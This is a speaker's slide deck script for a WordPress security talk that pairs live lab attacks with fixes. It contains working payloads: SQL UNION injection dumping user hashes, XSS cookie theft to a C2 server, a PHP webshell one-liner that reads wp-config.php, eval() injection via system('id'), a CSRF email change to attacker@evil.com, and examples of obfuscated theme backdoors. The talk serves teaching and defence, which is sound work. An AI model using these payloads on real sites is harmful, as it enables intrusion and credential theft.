# Google Slides Deck — Actually Secure Your WordPress (or Keep Yourself Positive)

> dev.bg Cyber Security User Group — 20.04.2026, 19:30
> Copy each slide's content into Google Slides.
> Recommended: dark theme (e.g. "Simple Dark" or import a hacker-green-on-black theme).
> Font: monospace for code (Fira Code / Source Code Pro), sans-serif for text (Inter / Roboto).

---

## Slide 1 — Title

**Actually Secure Your WordPress**
*…or Keep Yourself Positive*

dev.bg Cyber Security User Group
April 20, 2026

Nedko Hristov
Senior DevOps Engineer @ Nemetschek Bulgaria

> **Speaker notes:** Quick intro — DevOps, homelabbing, security background. "WordPress powers 43% of the web — and that makes it target #1."

---

## Slide 2 — Agenda

**What we'll cover today**

1. 🔴 Real attacks — 9 attack demos, 5 OWASP categories, live
2. 🔧 DevOps hardening — PHP, Redis, DB hygiene, CI/CD scanning
3. 🛡️ Infrastructure — Nginx, read-only, integrity checks
4. 📋 Monitoring — logging, backup strategy

Everything runs in an isolated Docker environment — no real sites harmed.

At the end: **full source code** — Docker Compose, scripts, vulnerable plugins, hardened configs — everything you need to reproduce this yourself.

> **Speaker notes:** "You'll see both sides — how the attack works and how to defend. Everything is live, everything is reproducible. At the end I'll share the full repo — Docker Compose + scripts + all the wizardry."

---

## Slide 3 — The Stack

**Demo Environment**

```
┌─────────────┐  ┌──────────┐  ┌──────────┐  ┌─────────────┐
│  WordPress  │  │  MySQL   │  │  Redis   │  │  Attacker   │
│  PHP 8.3    │  │  8.0     │  │  7.x     │  │  Flask C2   │
│  :8080      │  │  :3306   │  │  :6379   │  │  :9090      │
└─────────────┘  └──────────┘  └──────────┘  └─────────────┘
```

3 containers (base) + 2 tools profile · everything lives in the repo

```bash
# Base stack
docker compose up -d --build

# + WPScan & attacker C2 (when needed)
docker compose --profile tools up -d
```

> **Speaker notes:** "The attacker has their own C2 server on port 9090 — we'll see it steal cookies live."

---

## ──────── BLOCK 1: SECURITY & REAL ATTACKS ────────

---

## Slide 4 — Enumeration (Section 1)

**OWASP A07 — Security Misconfiguration**

🔍 **What does an attacker see before they attack?**

- `/?author=1` → redirect leaks username
- `/wp-json/wp/v2/users` → full user list
- `<meta name="generator">` → WordPress 6.9
- Login form → "Password incorrect for **admin**"

All without authentication.

> **Speaker notes:** "4 enumeration vectors. REST API is enabled by default."

---

## Slide 5 — Enumeration Demo

**🖥️ LIVE DEMO**

`curl /?author=1` → admin
`curl /wp-json/wp/v2/users` → all users
`curl /admin-ajax.php?action=vuln_debug_info` → PHP version, OS, extensions

🔑 One `nopriv_` hook = entire server fingerprinted

> **Speaker notes:** Switch to terminal. Show author redirect, REST API, then debug_info. Explain wp_ajax vs wp_ajax_nopriv.

---

## Slide 6 — nopriv_ Pattern

**One word, millions of exposed sites**

```php
// ✅ Authenticated users only
add_action('wp_ajax_my_action', ...);

// ❌ EVERYONE — including attackers
add_action('wp_ajax_nopriv_my_action', ...);
```

- **RevSlider CVE-2014-9734** — 100K+ sites in one weekend
- **WP Query Console 2024** — unauthenticated PHP eval

> **Speaker notes:** "Developer adds nopriv_ for testing, forgets to remove it → production exploit."

---

## Slide 7 — SQL Injection (Section 2)

**OWASP A03 — Injection**

💉 **Direct data extraction from the database**

```php
// ❌ String concatenation
"SELECT * FROM wp_posts WHERE title LIKE '%$q%'"

// ✅ Parameterized query
$wpdb->prepare("SELECT * FROM wp_posts WHERE title LIKE %s", ...)
```

**CVE-2024-2879** — LayerSlider, 1M+ installs, CVSS 9.8

> **Speaker notes:** "One missing $wpdb->prepare() — and the entire database belongs to the attacker."

---

## Slide 8 — SQLi Demo

**🖥️ LIVE DEMO**

1. Normal search → query visible in the response
2. `' OR '1'='1` → Boolean injection
3. `' UNION SELECT user_login, user_pass, user_email FROM wp_users--` → 💀

**Result:** 4 users + bcrypt hashes + emails

4. Fixed endpoint → `$wpdb->prepare()` → empty result ✅

> **Speaker notes:** Show the query_executed field. UNION is a classic — allows arbitrary SELECT. Then show vuln_search_fixed.

---

## Slide 9 — XSS (Section 3)

**OWASP A03 — Injection (client-side)**

🎭 **Reflected vs Stored**

| | Reflected | Stored |
|---|-----------|--------|
| **Payload** | In the URL | In the database |
| **Scope** | Clicked the link | Every visitor |
| **Example** | `?q=<script>...` | Guestbook entry |

```php
// ❌  echo $query;
// ✅  echo esc_html($query);
```

> **Speaker notes:** "One function — esc_html() — solves the problem."

---

## Slide 10 — XSS Demo

**🖥️ LIVE DEMO**

1. `?q=hello` → normal page
2. `?q=<h1>HACKED</h1><style>body{background:red}` → 🔴 page turns red
3. Stored XSS → guestbook + attacker C2
4. `curl :9090/loot` → stolen session cookie 💀

**CVE-2022-1329** — Elementor 5M+ installs, subscriber → admin hijack

> **Speaker notes:** Show Step 2 for visual impact. Then inject into guestbook and show loot on C2.

---

## Slide 11 — CSRF (Section 4)

**OWASP A01 — Broken Access Control**

🎣 **The victim's browser makes a request on their behalf**

- No nonce = no protection
- Hidden form + auto-submit = silent email change
- **Fix:** `wp_verify_nonce()` + `SameSite` cookie

**🖥️ DEMO:** Open `csrf-attack.html` → admin email changed

> **Speaker notes:** "You clicked Claim Prize — and your email is now attacker@evil.com. No JavaScript, just an HTML form."

---

## Slide 12 — IDOR (Section 5)

**OWASP A01 — Broken Access Control**

🔢 **Change the ID = see someone else's data**

```
?action=vuln_get_user&id=1  → admin (administrator)
?action=vuln_get_user&id=2  → editor
?action=vuln_get_user&id=3  → author
?action=vuln_get_post&id=1  → draft/private post
```

**Fix:** `current_user_can('edit_post', $id)`

- **CVE-2023-2986** — WooCommerce Stripe, CVSS 9.8, 900K+ installs

> **Speaker notes:** Show the for loop for user enumeration + draft post read. "Same pattern as WooCommerce Stripe — order_id with no auth check."

---

## Slide 13 — File Upload (Section 6)

**OWASP A04 — Insecure Design**

📁 **No validation = PHP webshell on the server**

```
Upload shell.php → Execute ?cmd=id → uid=33(www-data)
                 → ?cmd=cat wp-config.php → DB credentials
```

**Fix:**
- Extension whitelist (jpg, png, pdf)
- MIME validation (`finfo`)
- Randomized filename
- Nginx: block PHP in `/uploads/`

> **Speaker notes:** "Webshell = game over. Read wp-config.php, grab DB credentials, do whatever you want."

---

## Slide 14 — File Upload Demo

**🖥️ LIVE DEMO**

```bash
# Create + upload webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -F 'file=@/tmp/shell.php' ?action=vuln_upload

# Execute
curl shell.php?cmd=id                  → www-data
curl shell.php?cmd=cat+wp-config.php   → 💀

# Fixed version
curl -F 'file=@/tmp/shell.php' ?action=vuln_upload_fixed
→ "File type .php is not allowed" ✅
```

> **Speaker notes:** Show upload, then id, then wp-config.php. Finally show the fixed version.

---

## Slide 15 — RCE via eval() (Section 7)

**OWASP A03 — Injection**

🧮 **"Calculator" with eval() = arbitrary PHP code**

```php
// "Calculator" feature
eval('return ' . $_POST['expression'] . ';');

// Attacker sends:
expression=system('id')
→ uid=33(www-data)
```

**Fix:** Regex whitelist `/^[0-9+\-*\/. ()]+$/` — no eval()

> **Speaker notes:** "eval() is always evil. In PHP 8 you can't disable it with disable_functions."

---

## Slide 16 — WPScan (Section 8)

**Everything from Sections 1–7, automated**

```bash
docker compose --profile tools run --rm wpscan \
  --url http://wordpress --force --enumerate u,vp,vt
```

- WP version + known CVEs
- Plugin/theme detection
- User enumeration
- Brute-force with wordlist → `admin:admin123` ✅

**Takeaway:** If WPScan finds it, bots are already exploiting it.

> **Speaker notes:** "Everything we did manually in 7 sections — WPScan does in seconds. Run it against your own site. `--force` is needed because siteurl is localhost:8080 — unreachable from inside Docker."

---

## Slide 17 — Supply Chain (Section 9)

**OWASP A08 — Software and Data Integrity Failures**

🏴‍☠️ **Nulled themes = free backdoor**

3 backdoor types in `functions.php`:
1. **Obfuscated eval** — looks like a license check
2. **Hidden admin** — `wp_create_user('support_admin', 'h4ck3d!')`
3. **Phone-home** — exfiltrates URL + admin email on every page load

+ **Webshell** in `social-icons.php` — hex-encoded `system()`

> **Speaker notes:** "Save $50 on a theme — give the attacker full access. 100% infection rate in independent audits."

---

## Slide 18 — Obfuscation Techniques

**How backdoors hide from `grep`**

| Technique | Code | Decodes to |
|-----------|------|------------|
| base64 | `base64_decode('c3lzdGVt...')` | `system()` |
| Double base64 | Decode → still base64 → decode | `system()` |
| Hex string | `"\x73\x79\x73\x74\x65\x6d"` | `"system"` |
| chr() | `chr(115).chr(121)...` | `"system"` |
| gzip+base64 | `gzinflate(base64_decode(...))` | `system()` |

**Quick audit:** `grep -rn 'eval\|base64_decode' wp-content/themes/`

> **Speaker notes:** Show social-icons.php — grep -r 'system' finds nothing because it's hex-encoded. Show the live webshell.

---

## ──────── BLOCK 2: DEVOPS ARCHITECTURE ────────

---

## Slide 19 — PHP Hardening (Section 10)

**`php-demo.ini` → `php-hardened.ini`**

| Setting | Insecure | Hardened |
|---------|----------|---------|
| `display_errors` | On | **Off** |
| `expose_php` | On | **Off** |
| `disable_functions` | *(empty)* | **exec, system, passthru...** |
| `open_basedir` | *(none)* | **/var/www/html:/tmp** |
| `cookie_httponly` | 0 | **1** |

`disable_functions` would have blocked the RCE demo from Section 7.
`cookie_httponly` would have blocked the XSS cookie theft from Section 3.

> **Speaker notes:** "Two INI files — 7 lines of config — block 2 entire attack categories."

---

## Slide 20 — Redis Object Caching (Section 11)

**Every request = dozens of SQL queries → Redis caches them in RAM**

```
Localhost (Docker):  Redis adds ~2ms overhead — negligible or slightly slower
                     → MySQL is already local, benefit doesn't show

Production:          DB on separate server, each query = 5–20ms network RTT
                     → Redis eliminates those round-trips
                     → 150 req/s → 800 req/s under load
```

```bash
docker compose exec redis redis-cli DBSIZE  →  92 keys cached
```

The cache IS working. The gain requires real network distance to the DB.

> **Speaker notes:** "On localhost Redis is slightly slower — and I'll show you that live. But look: 92 queries cached. In production where the DB is on a separate host, each of those would be a 10ms network round-trip. That's where Redis earns its keep."

---

## Slide 21 — DB Hygiene (Section 12)

**What WordPress accumulates over time**

`wp-bloat.sh` seeds realistic production-like garbage:
- 800 expired transients
- 100 orphaned plugin option rows (~50 KB each) → **~5 MB autoloaded on every request**
- 3,000 orphaned post meta + 1,500 orphaned user meta (deleted plugins/users leave these behind)
- 25,000 post revisions · 1,000 WooCommerce products · 750 spam comments

`wp-cleanup.sh` does what any DBA would:
- Deletes expired transients, orphaned meta, revisions, auto-drafts, spam
- Prints before/after counts so you can see what was removed

| What | BEFORE | AFTER |
|------|--------|-------|
| Autoload size | **~5 MB** | **0.05 MB** |
| Expired transients | 800 | 0 |
| Orphaned meta | 4,500 | 0 |
| Revisions | 25,000+ | 0 |

> **Speaker notes:** "Autoload options — WordPress reads ALL of them on EVERY request. 5 MB × 1000 visitors = your DB server crying. These scripts reproduce what a neglected production site looks like after 2 years."

---

## Slide 22 — Performance Demo

**🖥️ LIVE DEMO — 4 measurements, live terminal**

```bash
# 1. Disable Redis, seed bloat
docker compose exec wordpress wp redis disable --allow-root
docker compose exec wordpress wp-bloat.sh

# 2. Measure: baseline (no Redis, full bloat)
docker compose exec wordpress wp-perf-test.sh before

# 3. Enable Redis + warm up cache, then measure
docker compose exec wordpress wp redis enable --allow-root
for i in $(seq 1 5); do curl -s http://localhost:8080/ > /dev/null; done
docker compose exec wordpress wp-perf-test.sh redis

# 4. Clean up DB — measure again (Redis on, no bloat)
docker compose exec wordpress wp-cleanup.sh
docker compose exec wordpress wp-perf-test.sh after
```

Results appear in the terminal — TTFB, p99, autoload size, diff table.

> **Speaker notes:** "Four numbers. Same WordPress, same hardware. Watch what happens at each step. DB cleanup alone is the biggest win — that's the one most sites never do."

---

## Slide 23 — CI/CD Security Scanning

**Automate what you just did manually — on every deploy**

```yaml
# .github/workflows/security.yml
- name: WPScan (staging)
  run: |
    docker run wpscanteam/wpscan \
      --url $STAGING_URL --enumerate vp,vt

- name: Trivy (container image)
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'wordpress:latest'
    severity: 'HIGH,CRITICAL'
    exit-code: '1'          # block the merge

- name: Composer audit
  run: composer audit
```

- HIGH/CRITICAL CVE → deploy blocked automatically
- Container base image scanned on every PR
- Free: GitHub Actions free tier

> **Speaker notes:** "Everything WPScan did manually — gate your deploy on it. Every PR. If a new CVE drops and your container has it — the pipeline fails before it reaches production."

---

## ──────── BLOCK 3: INFRASTRUCTURE ────────

---

## Slide 24 — Nginx Hardening (Section 13)

**10 minutes of config = 80% smaller attack surface**

```nginx
# Block webshells in uploads
location ~* /uploads/.*\.php$ { deny all; }

# Rate limit login
limit_req_zone ... zone=wp_login rate=3r/m;

# Block enumeration
location ~* /wp-json/wp/v2/users { deny all; }

# Security headers (CSP blocks XSS fetch)
Content-Security-Policy: script-src 'self';
```

Defence in depth — even if the upload succeeds, execution is blocked.

> **Speaker notes:** "The webshell from Section 6 would have returned 403. CSP from Section 3 would have blocked the fetch to C2."

---

## Slide 25 — Read-Only Protections (Section 14)

**Minimize attack surface after compromise**

```php
// wp-config.php
define('DISALLOW_FILE_EDIT', true);   // no Theme/Plugin Editor
define('DISALLOW_FILE_MODS', true);   // no install/update from UI
```

```bash
chmod 440 wp-config.php               # read-only
```

Containerised production: **read-only filesystem** + writable `/uploads/` volume

> **Speaker notes:** "If the attacker gets admin access, they can't inject PHP through the UI. Deployments only through CI/CD."

---

## Slide 26 — Integrity Checking (Section 15)

**Detect: core file modified → caught instantly**

```bash
# Tamper
echo '<!-- injected -->' >> wp-includes/version.php

# Detect (SHA256 vs wordpress.org manifest)
wp core verify-checksums
→ Warning: File has been modified: wp-includes/version.php

# Fix
wp core download --force
→ Success: WordPress installation verifies against checksums.
```

Automate: cron every 6h + email alert

> **Speaker notes:** Show the tamper → detect → fix cycle live. "One modified byte — caught."

---

## ──────── BLOCK 4: PROTECTION & MONITORING ────────

---

## Slide 27 — Logging & Backups (Section 16)

**Know what's happening. Have a plan B.**

```bash
# Failed login → debug.log
curl -d 'log=admin&pwd=wrong' /wp-login.php
tail debug.log → [SECURITY] Failed login: admin from 172.18.0.1

# Backup
wp db export /tmp/backup-20260420.sql
```

**3-2-1 rule:** 3 copies · 2 media types · 1 off-site
**Test your backups** — an untested backup is not a backup

> **Speaker notes:** "If you don't know you're being attacked, you can't respond. If you don't have a backup, you can't recover."

---

## Slide 28 — The Full Picture

**16 sections · 6 OWASP categories · 1 stack**

| # | Attack | Fix |
|---|--------|-----|
| 1 | Enumeration | Disable REST, remove generator |
| 2 | SQL Injection | `$wpdb->prepare()` |
| 3 | XSS | `esc_html()` |
| 4 | CSRF | `wp_verify_nonce()` |
| 5 | IDOR | `current_user_can()` |
| 6 | File Upload | Extension whitelist + nginx block |
| 7 | RCE | Regex whitelist, no `eval()` |
| 8 | WPScan | Run it yourself first |
| 9 | Supply Chain | Official sources only |
| 10–16 | Hardening | PHP ini, Redis, DB, CI/CD, Nginx, R/O, checksums, logs |

> **Speaker notes:** "Every attack has a specific fix. Most are 1–3 lines of code or config."

---

## Slide 29 — Defence in Depth

**No single measure is enough. Layers work together.**

```
         ┌─────────────────────────┐
         │  Cloudflare (WAF/CDN)   │  ← DDoS, bot protection, rate limits
         ├─────────────────────────┤
         │    Nginx (edge rules)   │  ← blocks uploads, enumeration
         ├─────────────────────────┤
         │    PHP (hardened ini)   │  ← disable_functions, open_basedir
         ├─────────────────────────┤
         │  WordPress (code fixes) │  ← esc_html, prepare, nonces
         ├─────────────────────────┤
         │    MySQL (hygiene)      │  ← autoload cleanup, revisions
         ├─────────────────────────┤
         │  OS (permissions, R/O)  │  ← chmod 440, read-only mount
         └─────────────────────────┘
```

> **Speaker notes:** "Cloudflare filters before traffic even reaches your server. A webshell can bypass PHP validation — Nginx blocks it. XSS can bypass the code — CSP blocks it. No single layer is perfect on its own."

---

## Slide 30 — Quick Wins Checklist

**6 things you can do TODAY**

1. ✅ `wp core verify-checksums` — check for tampering
2. ✅ `grep -rn 'eval\|base64_decode' wp-content/` — audit your themes
3. ✅ Add `WP_POST_REVISIONS` and `DISALLOW_FILE_EDIT` to `wp-config.php`
4. ✅ Block PHP execution in `/uploads/` (nginx or .htaccess)
5. ✅ Install Redis Object Cache + clean up autoload options
6. ✅ Point your domain at Cloudflare — free WAF, rate limiting, DDoS protection in 15 min

$0 · 45 minutes · dramatic difference

> **Speaker notes:** "This isn't theory. 6 actions, 45 minutes. Do it tonight."

---

## Slide 31 — Resources

**Full source code — everything from this talk:**

🔗 `github.com/[your-repo]`

```bash
git clone ... && docker compose up -d --build
docker compose exec wordpress wp-setup.sh
docker compose exec wordpress wp-bloat.sh
docker compose --profile tools up -d   # start WPScan + attacker C2
```
→ Complete lab environment in 2 minutes

**Included:** Docker Compose, Dockerfiles, vulnerable plugin, hardened plugin, nulled theme, attack scripts, cleanup scripts, perf tests, nginx config, PHP configs — all the wizardry.

**Links:**
- OWASP Top 10: owasp.org/Top10
- WPScan DB: wpscan.com
- Patchstack DB: patchstack.com/database
- Cloudflare Free: cloudflare.com/plans

> **Speaker notes:** "The repo is public. Clone it, run docker compose, play with it. Everything I showed is there — Docker Compose, scripts, configs, vulnerable and hardened code. Reproduce every demo yourself."

---

## Slide 32 — Q&A

**Questions?**

🎤

> **Speaker notes:** 10 minutes for Q&A. If no questions, show the WPScan scan or repeat the cookie theft demo.

---

## Slide 33 — Thank You

**Thank you!**

Nedko Hristov
Senior DevOps Engineer @ Nemetschek Bulgaria

🔗 GitHub repo QR code
🐦 [your social handles]

> **Speaker notes:** Show QR code to the repo. "Stay positive, stay secure."

---

# Production Notes

## Timing guide (52 min)

| Block | Slides | Time |
|-------|--------|------|
| Intro + Stack | 1–3 | 3 min |
| Enumeration | 4–6 | 5 min |
| SQLi | 7–8 | 4 min |
| XSS | 9–10 | 5 min |
| CSRF + IDOR | 11–12 | 4 min |
| File Upload | 13–14 | 4 min |
| RCE + WPScan | 15–16 | 4 min |
| Supply Chain | 17–18 | 5 min |
| PHP + Redis + DB + CI/CD | 19–23 | 10 min |
| Nginx + R/O + Integrity | 24–26 | 4 min |
| Logging + Summary | 27–31 | 4 min |
| **Total** | **33 slides** | **~52 min** |

## Slide design tips for Google Slides

1. **Theme:** Use "Simple Dark" or import a dark template. Terminal demos against a light background are painful.
2. **Font sizes:** Title 36pt, body 24pt, code 20pt monospace.
3. **Code blocks:** Use a text box with dark gray background (#1e1e1e) and green/white monospace text. Or screenshot from VS Code with a dark theme.
4. **Transitions:** None. Instant transitions. No animations — they waste time and look unprofessional at tech talks.
5. **DEMO slides:** Make them visually distinct — red accent bar or "🖥️ LIVE DEMO" badge. This signals the audience to look at the terminal, not the slide.
6. **One idea per slide.** If you're reading more than 4 bullets, split the slide.

## Demo flow reminders

- Second monitor: `presentation-demo-execution.md` open in VS Code
- Terminal font: 18pt+ so remote viewers can read
- After each attack demo, briefly show the fix (takes 10 seconds, anchors the lesson)
- If a demo fails: "This is why we test in Docker" → move to next section
- WPScan can be slow (30s+) — start it, talk while it runs
